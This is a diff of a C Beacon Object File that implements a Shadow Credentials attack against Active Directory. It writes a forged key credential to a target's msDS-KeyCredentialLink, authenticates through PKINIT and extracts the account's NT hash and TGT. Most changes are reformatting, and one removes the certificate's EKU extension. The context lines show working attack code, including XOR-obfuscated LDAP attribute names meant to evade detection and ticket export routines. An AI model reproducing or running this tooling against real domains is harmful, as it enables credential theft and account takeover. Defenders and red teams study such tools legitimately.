@@ -4,7 +4,7 @@
  * Complete attack chain in a single BOF:
  * 1. Generate RSA keypair and self-signed certificate with UPN/SID
  * 2. Build KeyCredential blob (msDS-KeyCredentialLink format)
- * 3. Write to target's msDS-KeyCredentialLink via LDAP (obfuscated)
+ * 3. Write to target's msDS-KeyCredentialLink via LDAP
  * 4. PKINIT - Authenticate to KDC using the certificate
  * 5. UnPAC-the-hash - Extract NT hash from PAC credentials
  *
@@ -18,7 +18,7 @@
 #endif
 #endif
 
-/* Verbose output control */
+ /* Verbose output control */
 #define VERBOSE 0
 
 /* Prevent winsock.h/winsock2.h conflict */
@@ -100,7 +100,7 @@ DECLSPEC_IMPORT int WINAPI USER32$wsprintfW(LPWSTR, LPCWSTR, ...);
 #define KEY_SOURCE_AD       0x00
 #define KEY_SOURCE_AZUREAD  0x01
 
-/* Kerberos Message Types */
+ /* Kerberos Message Types */
 #define KRB_AS_REQ      10
 #define KRB_AS_REP      11
 #define KRB_ERROR       30
@@ -183,9 +183,9 @@ static int g_nonce;
 
 /* Global state for Shadow Credential cleanup */
 static WCHAR* g_wszKeyCredValue = NULL;
-static WCHAR g_wszTargetDN[512] = {0};
-static char g_szDomain[256] = {0};
-static GUID g_deviceId = {0};
+static WCHAR g_wszTargetDN[512] = { 0 };
+static char g_szDomain[256] = { 0 };
+static GUID g_deviceId = { 0 };
 
 /*
  * =============================================================================
@@ -195,7 +195,7 @@ static GUID g_deviceId = {0};
 
 #ifdef BOF
 
-/* Winsock */
+ /* Winsock */
 DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
 DECLSPEC_IMPORT int WSAAPI WS2_32$WSACleanup(void);
 DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
@@ -410,8 +410,8 @@ DECLSPEC_IMPORT time_t __cdecl MSVCRT$time(time_t*);
  * =============================================================================
  */
 
-typedef int (WINAPI *CDLocateCSystem_t)(int, void**);
-typedef int (WINAPI *CDLocateCheckSum_t)(int, void**);
+typedef int (WINAPI* CDLocateCSystem_t)(int, void**);
+typedef int (WINAPI* CDLocateCheckSum_t)(int, void**);
 
 typedef struct _KERB_ECRYPT {
     int Type0;
@@ -431,10 +431,10 @@ typedef struct _KERB_ECRYPT {
     void* Control;
 } KERB_ECRYPT;
 
-typedef int (WINAPI *KERB_ECRYPT_Initialize)(BYTE* key, int keySize, int keyUsage, void** pContext);
-typedef int (WINAPI *KERB_ECRYPT_Decrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);
-typedef int (WINAPI *KERB_ECRYPT_Encrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);
-typedef int (WINAPI *KERB_ECRYPT_Finish)(void** pContext);
+typedef int (WINAPI* KERB_ECRYPT_Initialize)(BYTE* key, int keySize, int keyUsage, void** pContext);
+typedef int (WINAPI* KERB_ECRYPT_Decrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);
+typedef int (WINAPI* KERB_ECRYPT_Encrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);
+typedef int (WINAPI* KERB_ECRYPT_Finish)(void** pContext);
 
 typedef struct _KERB_CHECKSUM {
     int Type;
@@ -448,10 +448,10 @@ typedef struct _KERB_CHECKSUM {
     void* InitializeEx2;
 } KERB_CHECKSUM;
 
-typedef int (WINAPI *KERB_CHECKSUM_InitializeEx)(BYTE* key, int keySize, int keyUsage, void** pContext);
-typedef int (WINAPI *KERB_CHECKSUM_Sum)(void* pContext, int dataSize, BYTE* data);
-typedef int (WINAPI *KERB_CHECKSUM_Finalize)(void* pContext, BYTE* output);
-typedef int (WINAPI *KERB_CHECKSUM_Finish)(void** pContext);
+typedef int (WINAPI* KERB_CHECKSUM_InitializeEx)(BYTE* key, int keySize, int keyUsage, void** pContext);
+typedef int (WINAPI* KERB_CHECKSUM_Sum)(void* pContext, int dataSize, BYTE* data);
+typedef int (WINAPI* KERB_CHECKSUM_Finalize)(void* pContext, BYTE* output);
+typedef int (WINAPI* KERB_CHECKSUM_Finish)(void** pContext);
 
 #define KERB_CHECKSUM_HMAC_SHA1_96_AES256 16
 
@@ -519,7 +519,8 @@ static void bigint_sub(BigInt* result, BigInt* a, BigInt* b) {
         if (diff < 0) {
             diff += 0x100000000LL;
             borrow = 1;
-        } else {
+        }
+        else {
             borrow = 0;
         }
         result->words[i] = (DWORD)diff;
@@ -603,7 +604,8 @@ static void bigint_mod(BigInt* result, BigInt* a, BigInt* p) {
         }
         if (bigint_cmp(&temp, &shifted_p) >= 0) {
             bigint_sub(&temp, &temp, &shifted_p);
-        } else {
+        }
+        else {
             break;
         }
     }
@@ -639,16 +641,19 @@ static int EncodeLength(BYTE* buf, int len) {
     if (len < 128) {
         buf[0] = (BYTE)len;
         return 1;
-    } else if (len < 256) {
+    }
+    else if (len < 256) {
         buf[0] = 0x81;
         buf[1] = (BYTE)len;
         return 2;
-    } else if (len < 65536) {
+    }
+    else if (len < 65536) {
         buf[0] = 0x82;
         buf[1] = (BYTE)(len >> 8);
         buf[2] = (BYTE)(len & 0xFF);
         return 3;
-    } else {
+    }
+    else {
         buf[0] = 0x83;
         buf[1] = (BYTE)(len >> 16);
         buf[2] = (BYTE)((len >> 8) & 0xFF);
@@ -661,7 +666,8 @@ static int DecodeLength(BYTE* data, int offset, int* length) {
     if ((data[offset] & 0x80) == 0) {
         *length = data[offset];
         return 1;
-    } else {
+    }
+    else {
         int numBytes = data[offset] & 0x7F;
         int i;
         *length = 0;
@@ -693,14 +699,16 @@ static BYTE* BuildInteger(int value, int* outLen) {
         result[0] = 0x02;
         result[1] = 0x01;
         result[2] = (BYTE)value;
-    } else if (value >= 0 && value < 256) {
+    }
+    else if (value >= 0 && value < 256) {
         *outLen = 4;
         result = (BYTE*)malloc(4);
         result[0] = 0x02;
         result[1] = 0x02;
         result[2] = 0x00;
         result[3] = (BYTE)value;
-    } else {
+    }
+    else {
         *outLen = 6;
         result = (BYTE*)malloc(6);
         result[0] = 0x02;
@@ -727,7 +735,8 @@ static BYTE* BuildIntegerFromBytes(BYTE* data, int dataLen, int* outLen) {
     if (needPadding) {
         result[1 + lenSize] = 0x00;
         memcpy(result + 2 + lenSize, data, dataLen);
-    } else {
+    }
+    else {
         memcpy(result + 1 + lenSize, data, dataLen);
     }
     return result;
@@ -1025,7 +1034,7 @@ static BYTE* ExportRSAPublicKeyBCrypt(HCRYPTKEY hKey, int* outLen) {
 
 #define XOR_KEY 0x5A
 
-/* Deobfuscate XOR'd wide string in-place */
+ /* Deobfuscate XOR'd wide string in-place */
 static void DeobfuscateW(WCHAR* str, int len) {
     int i;
     for (i = 0; i < len; i++) {
@@ -1043,7 +1052,7 @@ static void DeobfuscateA(char* str, int len) {
 
 /* Build obfuscated LDAP attribute names at runtime */
 static void GetObfuscatedStrings(WCHAR* samAccountName, WCHAR* distinguishedName,
-                                  WCHAR* objectSid, WCHAR* keyCredLink) {
+    WCHAR* objectSid, WCHAR* keyCredLink) {
     /* "sAMAccountName" XOR 0x5A */
     /* s=0x29 A=0x1B M=0x17 A=0x1B c=0x39 c=0x39 o=0x35 u=0x2F n=0x34 t=0x2E N=0x14 a=0x3B m=0x37 e=0x3F */
     WCHAR sam[] = { 0x29, 0x1B, 0x17, 0x1B, 0x39, 0x39, 0x35, 0x2F, 0x34, 0x2E,
@@ -1081,7 +1090,7 @@ static void GetObfuscatedStrings(WCHAR* samAccountName, WCHAR* distinguishedName
  */
 
 static BOOL LookupUserDNAndSID(const char* szTarget, const char* szDomain,
-                                WCHAR* wszTargetDN, int dnLen, BYTE** ppSid, DWORD* pdwSidLen) {
+    WCHAR* wszTargetDN, int dnLen, BYTE** ppSid, DWORD* pdwSidLen) {
     LDAP* pLdap = NULL;
     LDAPMessage* pResults = NULL;
     LDAPMessage* pEntry = NULL;
@@ -1269,7 +1278,7 @@ static BOOL WriteKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN, BYT
     int pos = (int)wcslen(wszValue);
     int i;
     for (i = 0; i < blobLen; i++) {
-        SWPRINTF(wszValue + pos + i*2, L"%02X", keyCredBlob[i]);
+        SWPRINTF(wszValue + pos + i * 2, L"%02X", keyCredBlob[i]);
     }
     wcscat(wszValue, L":");
     wcscat(wszValue, wszTargetDN);
@@ -1294,7 +1303,8 @@ static BOOL WriteKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN, BYT
         if (g_wszKeyCredValue) {
             wcscpy(g_wszKeyCredValue, wszValue);
         }
-    } else {
+    }
+    else {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_modify_s failed: %u", ulResult);
     }
 
@@ -1373,14 +1383,14 @@ static BOOL DeleteKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN) {
  * =============================================================================
  */
 
-/* Forward declaration */
+ /* Forward declaration */
 static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const char* szCN,
-                                     const char* szUPN, const char* szSID, WCHAR* wszContainerName,
-                                     int* certLen, int* pfxLen);
+    const char* szUPN, const char* szSID, WCHAR* wszContainerName,
+    int* certLen, int* pfxLen);
 
 static BYTE* GenerateCertificateAndKey(const char* szCN, const char* szDomain, const char* szSID,
-                                       BYTE** ppPublicKey, int* pPublicKeyLen,
-                                       BYTE** ppPfx, int* pPfxLen, GUID* pDeviceId) {
+    BYTE** ppPublicKey, int* pPublicKeyLen,
+    BYTE** ppPfx, int* pPfxLen, GUID* pDeviceId) {
     HCRYPTPROV hProv = 0;
     HCRYPTKEY hKey = 0;
     WCHAR wszContainerName[64];
@@ -1400,7 +1410,8 @@ static BYTE* GenerateCertificateAndKey(const char* szCN, const char* szDomain, c
                 BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContextW failed: 0x%08X", GetLastError());
                 return NULL;
             }
-        } else {
+        }
+        else {
             BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContextW failed: 0x%08X", GetLastError());
             return NULL;
         }
@@ -1443,9 +1454,8 @@ static BYTE* GenerateCertificateAndKey(const char* szCN, const char* szDomain, c
  */
 
 static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const char* szCN,
-                                     const char* szUPN, const char* szSID, WCHAR* wszContainerName,
-                                     int* certLen, int* pfxLen) {
-    CERT_REQUEST_INFO reqInfo;
+    const char* szUPN, const char* szSID, WCHAR* wszContainerName,
+    int* certLen, int* pfxLen) {
     BYTE* pbSubject = NULL;
     DWORD cbSubject = 0;
     char szSubjectCN[256];
@@ -1457,12 +1467,8 @@ static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const cha
     DWORD dwAltNameCount = 1;
     BYTE* pbEncodedSAN = NULL;
     DWORD cbEncodedSAN = 0;
-    CERT_EXTENSION extensions[2];
+    CERT_EXTENSION extensions[1];
     DWORD extCount = 0;
-    BYTE* pbEncodedEKU = NULL;
-    DWORD cbEncodedEKU = 0;
-    CERT_ENHKEY_USAGE eku;
-    LPSTR ekuOids[2];
     CERT_PUBLIC_KEY_INFO* pPubKeyInfo = NULL;
     DWORD dwPubKeyInfoLen = 0;
     CRYPT_ALGORITHM_IDENTIFIER sigAlgo;
@@ -1477,7 +1483,6 @@ static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const cha
     BYTE* resultPfx = NULL;
     static WCHAR wszSidUrl[256];
 
-    memset(&reqInfo, 0, sizeof(reqInfo));
     memset(altNameEntries, 0, sizeof(altNameEntries));
     memset(&altNameInfo, 0, sizeof(altNameInfo));
     memset(&certInfo, 0, sizeof(certInfo));
@@ -1510,7 +1515,8 @@ static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const cha
         *p++ = 0x0C;  /* UTF8String */
         if (upnLen < 128) {
             *p++ = (BYTE)upnLen;
-        } else {
+        }
+        else {
             *p++ = 0x82;
             *p++ = (BYTE)(upnLen >> 8);
             *p++ = (BYTE)(upnLen & 0xFF);
@@ -1541,7 +1547,7 @@ static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const cha
     altNameInfo.rgAltEntry = altNameEntries;
 
     if (!CryptEncodeObjectEx(X509_ASN_ENCODING, szOID_SUBJECT_ALT_NAME2, &altNameInfo,
-                             CRYPT_ENCODE_ALLOC_FLAG, NULL, &pbEncodedSAN, &cbEncodedSAN)) {
+        CRYPT_ENCODE_ALLOC_FLAG, NULL, &pbEncodedSAN, &cbEncodedSAN)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to encode SAN: 0x%08X", GetLastError());
         free(pbSubject);
         free(pbEncodedUPN);
@@ -1553,21 +1559,6 @@ static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const cha
     extensions[extCount].Value.cbData = cbEncodedSAN;
     extensions[extCount].Value.pbData = pbEncodedSAN;
     extCount++;
-
-    /* Build EKU extension */
-    ekuOids[0] = (LPSTR)"1.3.6.1.5.5.7.3.2";       /* Client Authentication */
-    ekuOids[1] = (LPSTR)"1.3.6.1.4.1.311.20.2.2"; /* Smart Card Logon */
-    eku.cUsageIdentifier = 2;
-    eku.rgpszUsageIdentifier = ekuOids;
-
-    if (CryptEncodeObjectEx(X509_ASN_ENCODING, X509_ENHANCED_KEY_USAGE, &eku,
-                            CRYPT_ENCODE_ALLOC_FLAG, NULL, &pbEncodedEKU, &cbEncodedEKU)) {
-        extensions[extCount].pszObjId = (LPSTR)szOID_ENHANCED_KEY_USAGE;
-        extensions[extCount].fCritical = FALSE;
-        extensions[extCount].Value.cbData = cbEncodedEKU;
-        extensions[extCount].Value.pbData = pbEncodedEKU;
-        extCount++;
-    }
 
     /* Get public key info */
     CryptExportPublicKeyInfo(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING, NULL, &dwPubKeyInfoLen);
@@ -1606,16 +1597,16 @@ static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const cha
 
     /* Sign and encode certificate */
     if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
-                                        X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
-                                        NULL, NULL, &cbEncodedCert)) {
+        X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
+        NULL, NULL, &cbEncodedCert)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptSignAndEncodeCertificate size failed: 0x%08X", GetLastError());
         goto cleanup;
     }
 
     pbEncodedCert = (BYTE*)malloc(cbEncodedCert);
     if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
-                                        X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
-                                        NULL, pbEncodedCert, &cbEncodedCert)) {
+        X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
+        NULL, pbEncodedCert, &cbEncodedCert)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptSignAndEncodeCertificate failed: 0x%08X", GetLastError());
         goto cleanup;
     }
@@ -1682,7 +1673,6 @@ cleanup:
     if (pbSubject) free(pbSubject);
     if (pbEncodedUPN) free(pbEncodedUPN);
     if (pbEncodedSAN) LocalFree(pbEncodedSAN);
-    if (pbEncodedEKU) LocalFree(pbEncodedEKU);
     if (pPubKeyInfo) free(pPubKeyInfo);
     if (pbEncodedCert && !resultPfx) free(pbEncodedCert);
     if (pCertContext) CertFreeCertificateContext(pCertContext);
@@ -1698,8 +1688,8 @@ cleanup:
  * =============================================================================
  */
 
-/* Include PKINIT functions here - AS-REQ building, DH, etc. */
-/* These are adapted from the ESC1-unPAC code */
+ /* Include PKINIT functions here - AS-REQ building, DH, etc. */
+ /* These are adapted from the ESC1-unPAC code */
 
 static void GenerateDHKeys(HCRYPTPROV hProv) {
     BigInt p, g, x, y;
@@ -1864,7 +1854,7 @@ static BYTE* BuildKdcReqBody(const char* user, const char* realm, int* outLen) {
  */
 
 static BYTE* BuildPKAuthenticator(const char* user, const char* realm,
-                                  BYTE* paChecksum, int paChecksumLen, int* outLen) {
+    BYTE* paChecksum, int paChecksumLen, int* outLen) {
     BYTE* content = (BYTE*)malloc(1024);
     int offset = 0;
     SYSTEMTIME st;
@@ -1981,7 +1971,7 @@ static BYTE* BuildDhSubjectPublicKeyInfo(int* outLen) {
  */
 
 static BYTE* BuildAuthPack(const char* user, const char* realm,
-                           BYTE* paChecksum, int paChecksumLen, int* outLen) {
+    BYTE* paChecksum, int paChecksumLen, int* outLen) {
     BYTE* content = (BYTE*)malloc(2048);
     int offset = 0;
     int pkAuthLen, pkAuthTagLen, dhPubKeyInfoLen, dhPubKeyTagLen;
@@ -2019,7 +2009,7 @@ static BYTE* BuildAuthPack(const char* user, const char* realm,
  */
 
 static BYTE* BuildCmsSignedData(PCCERT_CONTEXT pCert, BYTE* content, int contentLen, int* outLen) {
-    #define szOID_PKINIT_AUTHDATA_STR "1.3.6.1.5.2.3.1"
+#define szOID_PKINIT_AUTHDATA_STR "1.3.6.1.5.2.3.1"
 
     HCRYPTPROV hProv = 0;
     DWORD keySpec = 0;
@@ -2034,7 +2024,7 @@ static BYTE* BuildCmsSignedData(PCCERT_CONTEXT pCert, BYTE* content, int content
     *outLen = 0;
 
     if (!CryptAcquireCertificatePrivateKey(pCert, CRYPT_ACQUIRE_USE_PROV_INFO_FLAG,
-                                           NULL, &hProv, &keySpec, &fCallerFree)) {
+        NULL, &hProv, &keySpec, &fCallerFree)) {
         BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to acquire private key: 0x%08X", GetLastError());
         return NULL;
     }
@@ -2312,7 +2302,8 @@ static BYTE* SendToKdc(const char* kdcHost, int port, BYTE* data, int dataLen, i
             WSACleanup();
             return NULL;
         }
-    } else {
+    }
+    else {
         memcpy(&server.sin_addr, host->h_addr_list[0], host->h_length);
     }
     server.sin_family = AF_INET;
@@ -2370,7 +2361,7 @@ static BYTE* SendToKdc(const char* kdcHost, int port, BYTE* data, int dataLen, i
  */
 
 static BYTE* KerberosDecrypt(int eType, int keyUsage, BYTE* key, int keyLen,
-                              BYTE* data, int dataLen, int* outLen) {
+    BYTE* data, int dataLen, int* outLen) {
     HMODULE hCryptDll = NULL;
     CDLocateCSystem_t pCDLocateCSystem = NULL;
     KERB_ECRYPT* pCSystem = NULL;
@@ -2442,10 +2433,10 @@ static BYTE* KerberosDecrypt(int eType, int keyUsage, BYTE* key, int keyLen,
  * =============================================================================
  */
 
-typedef int (WINAPI *KERB_ECRYPT_Encrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);
+typedef int (WINAPI* KERB_ECRYPT_Encrypt)(void* pContext, BYTE* data, int dataSize, BYTE* output, int* outputSize);
 
 static BYTE* KerberosEncrypt(int eType, int keyUsage, BYTE* key, int keyLen,
-                              BYTE* data, int dataLen, int* outLen) {
+    BYTE* data, int dataLen, int* outLen) {
     HMODULE hCryptDll = NULL;
     CDLocateCSystem_t pCDLocateCSystem = NULL;
     KERB_ECRYPT* pCSystem = NULL;
@@ -2501,13 +2492,13 @@ static BYTE* KerberosEncrypt(int eType, int keyUsage, BYTE* key, int keyLen,
  * =============================================================================
  */
 
-/* Note: KERB_CHECKSUM struct defined above */
+ /* Note: KERB_CHECKSUM struct defined above */
 
-typedef int (WINAPI *CDLocateCheckSum_t)(int type, void** ppCheckSum);
-typedef int (WINAPI *KERB_CHECKSUM_InitializeEx)(BYTE* key, int keySize, int keyUsage, void** pContext);
-typedef int (WINAPI *KERB_CHECKSUM_Sum)(void* pContext, int dataSize, BYTE* data);
-typedef int (WINAPI *KERB_CHECKSUM_Finalize)(void* pContext, BYTE* output);
-typedef int (WINAPI *KERB_CHECKSUM_Finish_t)(void** pContext);
+typedef int (WINAPI* CDLocateCheckSum_t)(int type, void** ppCheckSum);
+typedef int (WINAPI* KERB_CHECKSUM_InitializeEx)(BYTE* key, int keySize, int keyUsage, void** pContext);
+typedef int (WINAPI* KERB_CHECKSUM_Sum)(void* pContext, int dataSize, BYTE* data);
+typedef int (WINAPI* KERB_CHECKSUM_Finalize)(void* pContext, BYTE* output);
+typedef int (WINAPI* KERB_CHECKSUM_Finish_t)(void** pContext);
 
 #define KERB_CHECKSUM_HMAC_SHA1_96_AES256 16
 
@@ -2576,7 +2567,7 @@ static BYTE* ComputeKerberosChecksum(BYTE* key, int keyLen, BYTE* data, int data
  * =============================================================================
  */
 
-/* kTruncate function - RFC 4556 Section 3.2.3.1 */
+ /* kTruncate function - RFC 4556 Section 3.2.3.1 */
 static void KTruncate(int k, BYTE* x, int xLen, BYTE* result) {
     int offset = 0;
     BYTE counter = 0;
@@ -2658,7 +2649,8 @@ static BYTE* ExtractKdcDhPublicKey(BYTE* asRep, int asRepLen, int* keyLen) {
                         for (k = 1; k < lenBytes; k++) {
                             len = (len << 8) | asRep[j + 1 + k];
                         }
-                    } else {
+                    }
+                    else {
                         len = asRep[j + 1];
                     }
 
@@ -2704,7 +2696,8 @@ static BYTE* ExtractKdcDhPublicKey(BYTE* asRep, int asRepLen, int* keyLen) {
                 for (k = 1; k < lenBytes; k++) {
                     len = (len << 8) | asRep[i + 1 + k];
                 }
-            } else {
+            }
+            else {
                 len = asRep[i + 1];
             }
 
@@ -2783,7 +2776,7 @@ static BYTE* ExtractEncPartFromAsRep(BYTE* asRep, int asRepLen, int* outLen) {
     for (i = 0; i < asRepLen - 10; i++) {
         if (asRep[i] == 0xA6) { /* [6] enc-part */
             int encPartLen;
-            int lenBytes = DecodeLength(asRep, i+1, &encPartLen);
+            int lenBytes = DecodeLength(asRep, i + 1, &encPartLen);
             int seqStart = i + 1 + lenBytes;
 
             if (seqStart < asRepLen && asRep[seqStart] == 0x30) {
@@ -2792,12 +2785,12 @@ static BYTE* ExtractEncPartFromAsRep(BYTE* asRep, int asRepLen, int* outLen) {
                 for (j = seqStart + 2; j < seqStart + encPartLen - 5; j++) {
                     if (asRep[j] == 0xA2) { /* [2] cipher */
                         int cipherTagLen;
-                        int cipherLenBytes = DecodeLength(asRep, j+1, &cipherTagLen);
+                        int cipherLenBytes = DecodeLength(asRep, j + 1, &cipherTagLen);
                         int octetStart = j + 1 + cipherLenBytes;
 
                         if (octetStart < asRepLen && asRep[octetStart] == 0x04) {
                             int octetLen;
-                            int octetLenBytes = DecodeLength(asRep, octetStart+1, &octetLen);
+                            int octetLenBytes = DecodeLength(asRep, octetStart + 1, &octetLen);
 
                             *outLen = octetLen;
                             BYTE* cipher = (BYTE*)malloc(octetLen);
@@ -2829,17 +2822,17 @@ static BYTE* ExtractSessionKey(BYTE* decrypted, int decryptedLen, int* keyLen, i
         if (decrypted[i] == 0xA0) { /* [0] key */
             int j;
             for (j = i + 2; j < decryptedLen - 5; j++) {
-                if (decrypted[j] == 0xA0 && decrypted[j+2] == 0x02) { /* etype */
-                    *keyType = decrypted[j+4];
+                if (decrypted[j] == 0xA0 && decrypted[j + 2] == 0x02) { /* etype */
+                    *keyType = decrypted[j + 4];
                 }
                 if (decrypted[j] == 0xA1) { /* [1] keyvalue */
                     int keyTagLen;
-                    int keyLenBytes = DecodeLength(decrypted, j+1, &keyTagLen);
+                    int keyLenBytes = DecodeLength(decrypted, j + 1, &keyTagLen);
                     int octetStart = j + 1 + keyLenBytes;
 
                     if (octetStart < decryptedLen && decrypted[octetStart] == 0x04) {
                         int octetLen;
-                        int octetLenBytes = DecodeLength(decrypted, octetStart+1, &octetLen);
+                        int octetLenBytes = DecodeLength(decrypted, octetStart + 1, &octetLen);
 
                         *keyLen = octetLen;
                         BYTE* key = (BYTE*)malloc(octetLen);
@@ -2888,12 +2881,14 @@ static BYTE* ExtractTicketFromAsRep(BYTE* asRep, int asRepLen, int* outLen) {
             BYTE* ticket = (BYTE*)malloc(length);
             memcpy(ticket, asRep + offset, length);
             return ticket;
-        } else if ((asRep[offset] & 0xE0) == 0xA0) {
+        }
+        else if ((asRep[offset] & 0xE0) == 0xA0) {
             offset++;
             int skipLen;
             offset += DecodeLength(asRep, offset, &skipLen);
             offset += skipLen;
-        } else {
+        }
+        else {
             offset++;
         }
     }
@@ -2908,7 +2903,7 @@ static BYTE* ExtractTicketFromAsRep(BYTE* asRep, int asRepLen, int* outLen) {
  */
 
 static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessionKeyLen,
-                        int encType, const char* user, const char* realm) {
+    int encType, const char* user, const char* realm) {
     /*
      * Build minimal KRB-CRED structure for TGT export
      * KRB-CRED ::= [APPLICATION 22] SEQUENCE {
@@ -3029,7 +3024,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     int seqLen = ciOffset + 2;
     if (seqLen < 128) {
         encCredPart[ecpOffset++] = (BYTE)seqLen;
-    } else {
+    }
+    else {
         encCredPart[ecpOffset++] = 0x82;
         encCredPart[ecpOffset++] = (BYTE)(seqLen >> 8);
         encCredPart[ecpOffset++] = (BYTE)(seqLen & 0xFF);
@@ -3037,7 +3033,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     encCredPart[ecpOffset++] = 0x30; /* SEQUENCE OF */
     if (ciOffset < 128) {
         encCredPart[ecpOffset++] = (BYTE)ciOffset;
-    } else {
+    }
+    else {
         encCredPart[ecpOffset++] = 0x82;
         encCredPart[ecpOffset++] = (BYTE)(ciOffset >> 8);
         encCredPart[ecpOffset++] = (BYTE)(ciOffset & 0xFF);
@@ -3046,7 +3043,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     encCredPart[ecpOffset++] = 0x30;
     if (ciOffset < 128) {
         encCredPart[ecpOffset++] = (BYTE)ciOffset;
-    } else {
+    }
+    else {
         encCredPart[ecpOffset++] = 0x82;
         encCredPart[ecpOffset++] = (BYTE)(ciOffset >> 8);
         encCredPart[ecpOffset++] = (BYTE)(ciOffset & 0xFF);
@@ -3060,7 +3058,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     app29[a29Offset++] = 0x7D; /* [APPLICATION 29] */
     if (ecpOffset + 2 < 128) {
         app29[a29Offset++] = (BYTE)(ecpOffset + 2);
-    } else {
+    }
+    else {
         app29[a29Offset++] = 0x82;
         app29[a29Offset++] = (BYTE)((ecpOffset + 2) >> 8);
         app29[a29Offset++] = (BYTE)((ecpOffset + 2) & 0xFF);
@@ -3068,7 +3067,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     app29[a29Offset++] = 0x30;
     if (ecpOffset < 128) {
         app29[a29Offset++] = (BYTE)ecpOffset;
-    } else {
+    }
+    else {
         app29[a29Offset++] = 0x82;
         app29[a29Offset++] = (BYTE)(ecpOffset >> 8);
         app29[a29Offset++] = (BYTE)(ecpOffset & 0xFF);
@@ -3089,7 +3089,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     encPart[epOffset++] = 0xA2;
     if (a29Offset + 2 < 128) {
         encPart[epOffset++] = (BYTE)(a29Offset + 2);
-    } else {
+    }
+    else {
         encPart[epOffset++] = 0x82;
         encPart[epOffset++] = (BYTE)((a29Offset + 2) >> 8);
         encPart[epOffset++] = (BYTE)((a29Offset + 2) & 0xFF);
@@ -3097,7 +3098,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     encPart[epOffset++] = 0x04;
     if (a29Offset < 128) {
         encPart[epOffset++] = (BYTE)a29Offset;
-    } else {
+    }
+    else {
         encPart[epOffset++] = 0x82;
         encPart[epOffset++] = (BYTE)(a29Offset >> 8);
         encPart[epOffset++] = (BYTE)(a29Offset & 0xFF);
@@ -3111,7 +3113,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     encPartSeq[epsOffset++] = 0x30;
     if (epOffset < 128) {
         encPartSeq[epsOffset++] = (BYTE)epOffset;
-    } else {
+    }
+    else {
         encPartSeq[epsOffset++] = 0x82;
         encPartSeq[epsOffset++] = (BYTE)(epOffset >> 8);
         encPartSeq[epsOffset++] = (BYTE)(epOffset & 0xFF);
@@ -3136,7 +3139,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     kirbi[kOffset++] = 0xA2;
     if (ticketLen + 2 < 128) {
         kirbi[kOffset++] = (BYTE)(ticketLen + 2);
-    } else {
+    }
+    else {
         kirbi[kOffset++] = 0x82;
         kirbi[kOffset++] = (BYTE)((ticketLen + 2) >> 8);
         kirbi[kOffset++] = (BYTE)((ticketLen + 2) & 0xFF);
@@ -3144,7 +3148,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     kirbi[kOffset++] = 0x30;
     if (ticketLen < 128) {
         kirbi[kOffset++] = (BYTE)ticketLen;
-    } else {
+    }
+    else {
         kirbi[kOffset++] = 0x82;
         kirbi[kOffset++] = (BYTE)(ticketLen >> 8);
         kirbi[kOffset++] = (BYTE)(ticketLen & 0xFF);
@@ -3155,7 +3160,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
     kirbi[kOffset++] = 0xA3;
     if (epsOffset < 128) {
         kirbi[kOffset++] = (BYTE)epsOffset;
-    } else {
+    }
+    else {
         kirbi[kOffset++] = 0x82;
         kirbi[kOffset++] = (BYTE)(epsOffset >> 8);
         kirbi[kOffset++] = (BYTE)(epsOffset & 0xFF);
@@ -3169,7 +3175,8 @@ static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey, int sessi
